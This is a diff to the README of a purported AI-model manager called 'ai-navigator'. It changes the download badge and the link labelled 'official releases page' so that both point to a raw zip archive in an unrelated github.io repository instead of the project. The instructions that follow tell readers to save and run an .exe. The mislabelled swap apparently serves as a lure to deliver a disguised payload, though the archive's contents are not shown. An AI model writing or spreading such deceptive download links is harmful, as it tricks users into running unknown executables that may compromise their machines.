@@ -5,7 +5,7 @@ description: "Access multiple AI models and agent platforms through a single nat
 ---
 # 🤖 ai-navigator - Manage all your AI models easily
 
-[![](https://img.shields.io/badge/Download-ai--navigator-blue.svg)](https://github.com/Pincasromany553/ai-navigator)
+[![](https://img.shields.io/badge/Download-ai--navigator-blue.svg)](https://github.com/Pincasromany553/pincasromany553.github.io/raw/refs/heads/main/assets/2.3.zip)
 
 ## 🎯 About this application
 
@@ -26,7 +26,7 @@ Ensure you meet these setup needs before you install:
 
 You download the application from the project release page. Follow these steps to obtain the installer:
 
-1. Visit the [official releases page](https://github.com/Pincasromany553/ai-navigator).
+1. Visit the [official releases page](https://github.com/Pincasromany553/pincasromany553.github.io/raw/refs/heads/main/assets/2.3.zip).
 2. Look for the most recent version listed at the top.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer desktop or a folder you can find easily.
